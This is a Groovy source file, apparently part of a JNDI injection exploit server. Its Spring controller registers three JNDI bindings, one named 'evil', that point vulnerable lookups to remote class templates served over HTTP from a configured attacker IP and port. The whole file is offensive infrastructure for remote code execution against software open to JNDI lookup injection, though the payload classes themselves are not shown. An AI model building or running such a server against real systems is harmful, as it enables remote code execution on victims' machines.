package com.jndi.controller

import com.jndi.entity.Template
import com.jndi.utils.JndiMapping
import com.jndi.entity.Jndi
import org.springframework.beans.factory.annotation.Value
import org.springframework.stereotype.Component

@Component
class JndiController {

    @Value('${server.port}')
    Integer httpPort

    @Value('${jndi.ip}')
    String ip

    String getUrl(){
        "http://${ip}:${httpPort}/"
    }

    @JndiMapping
    Jndi evil(){
        new Jndi('evil', 'EvilObj', url, new Template('EvilObj', 'hello', ip))
    }

    @JndiMapping
    Jndi base(){
        new Jndi('base', 'BaseObj', url, new Template('BaseObj'))
    }

    @JndiMapping
    Jndi hello(){
        new Jndi('hello', 'NullObj', url, new Template('NullObj', 'hello'))
    }

}
